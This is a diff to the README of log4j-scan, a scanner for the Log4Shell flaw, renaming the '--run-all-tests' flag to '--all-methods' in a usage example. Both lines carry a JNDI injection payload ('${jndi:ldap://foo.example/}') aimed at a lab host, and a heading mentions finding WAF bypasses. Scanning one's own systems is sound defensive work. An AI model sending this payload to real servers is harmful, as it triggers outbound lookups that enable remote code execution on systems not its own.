@@ -49,7 +49,7 @@ $ python3 log4j-scan.py -u https://log4j.lab.local -p '${jndi:ldap://foo.example
 ## Scan a Single URL using all Request Methods: GET, POST (url-encoded form), POST (JSON body)
 
 ```shell
-$ python3 log4j-scan.py -u https://log4j.lab.local --run-all-tests -p '${jndi:ldap://foo.example/}'
+$ python3 log4j-scan.py -u https://log4j.lab.local --all-methods -p '${jndi:ldap://foo.example/}'
 ```
 
 ## Discover WAF bypasses on the environment.
